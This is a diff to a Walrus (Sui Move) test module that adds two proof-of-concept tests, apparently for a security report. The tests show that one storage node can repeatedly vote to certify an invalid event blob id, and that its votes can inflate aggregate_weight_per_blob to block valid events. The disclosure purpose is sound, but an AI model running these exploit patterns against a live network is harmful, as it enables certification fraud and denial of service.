@@ -4,6 +4,7 @@
 #[test_only]
 module walrus::event_blob_tests;
 
+use std::debug;
 use sui::test_utils::destroy;
 use walrus::{
     blob,
@@ -238,4 +239,131 @@ fun set_storage_node_caps(
         nodes.borrow_mut(index).set_storage_node_cap(storage_cap);
         index = index + 1;
     });
+}
+
+
+// Invalid certified blob id attack
+// run it and see that when it fails the latest certified event blob is the bad one which was only voted by node 9
+// the bug is that the same node can vote again and again for the same bad blob id everytime a new valid event blob is certified
+#[test]
+public fun certify_invalid_blob_id() {
+    let ctx = &mut tx_context::dummy();
+    let mut system: system::System = system::new_for_testing_with_multiple_members(ctx); // Total of 10 nodes
+    assert!(system.committee().to_vec_map().size() == 10);
+    let mut nodes = test_nodes();
+    set_storage_node_caps(&system, ctx, &mut nodes);
+
+    let bad_blob_id = blob::derive_blob_id(0xbeef, RED_STUFF, SIZE);
+    let mut i: u256 = 0;
+    while (i < 30) {
+        // certify new good blob id and sq=i*100
+        let good_blob_id = blob::derive_blob_id(i as u256, RED_STUFF, SIZE);    
+        let good_cp = 100* (i as u64);
+        let mut index = 0;
+        while (index < 9) {
+            system.certify_event_blob(
+                nodes.borrow_mut(index).cap_mut(),
+                good_blob_id,
+                i as u256,
+                SIZE,
+                RED_STUFF,
+                good_cp,
+                0,
+                ctx,
+            );
+            index = index + 1
+        };
+
+        let state = system.inner().get_event_blob_certification_state();
+        assert!(state.get_latest_certified_checkpoint_sequence_number() == option::some(good_cp));
+
+        // vote for bad_blob_id, always node 9 =        
+        let bad_cp = 100*(i as u64) + 1;
+        // next should never be certified...
+        system.certify_event_blob(
+            nodes.borrow_mut(9).cap_mut(),
+            bad_blob_id,
+            0xbeef,
+            SIZE,
+            RED_STUFF,
+            bad_cp,
+            0,
+            ctx,
+        );
+        let state = system.inner().get_event_blob_certification_state();
+        if (state.get_latest_certified_checkpoint_sequence_number() != option::some(good_cp)) {      
+            // check the output -> the bad blob id was certified!
+            debug::print(state);
+            debug::print(&bad_blob_id);
+            assert!(false);
+        };
+        i = i + 1
+    };
+    nodes.destroy!(|node| node.destroy());
+    destroy(system);
+}
+
+
+// DoS attack:
+// run next test with -i 1000000000000
+// it fails on MEMORY_LIMIT_EXCEEDED but from the debug logs it can be seen that aggregate_weight_per_blob is growing
+// and thus it can be used to completely fill aggregate_weight_per_blob and block future valid blob events
+#[test]
+public fun block_blob_events() {
+    let ctx = &mut tx_context::dummy();
+    let mut system: system::System = system::new_for_testing_with_multiple_members(ctx); // Total of 10 nodes
+    assert!(system.committee().to_vec_map().size() == 10);
+    let mut nodes = test_nodes();
+    set_storage_node_caps(&system, ctx, &mut nodes);
+
+    let mut i: u256 = 0;
+    while (i < 1002) {
+        // certify sq=i*100
+        let good_blob_id = blob::derive_blob_id(i as u256, RED_STUFF, SIZE);    
+        let good_cp = 100* (i as u64);
+        let mut index = 0;
+        while (index < 9) {
+            system.certify_event_blob(
+                nodes.borrow_mut(index).cap_mut(),
+                good_blob_id,
+                i as u256,
+                SIZE,
+                RED_STUFF,
+                good_cp,
+                0,
+                ctx,
+            );
+            index = index + 1
+        };
+
+        let state = system.inner().get_event_blob_certification_state();
+        assert!(state.get_latest_certified_checkpoint_sequence_number() == option::some(good_cp));
+
+        // vote for bad_blob_id, always node 9
+        let hash = 2000*(i as u256);
+        let bad_blob_id = blob::derive_blob_id(hash, RED_STUFF, SIZE);    
+        
+        let bad_cp = 100*(i as u64) + 1;
+        // next should never be certified...
+        system.certify_event_blob(
+            nodes.borrow_mut(9).cap_mut(),
+            bad_blob_id,
+            hash,
+            SIZE,
+            RED_STUFF,
+            bad_cp,
+            0,
+            ctx,
+        );
+        let state = system.inner().get_event_blob_certification_state();
+        if (state.get_latest_certified_checkpoint_sequence_number() != option::some(good_cp)) {      
+            // the bad blob id was certified!      
+            debug::print(state);
+            debug::print(&bad_blob_id);
+            assert!(false);
+        };
+        i = i + 1
+    };
+    nodes.destroy!(|node| node.destroy());
+    destroy(system);
 }
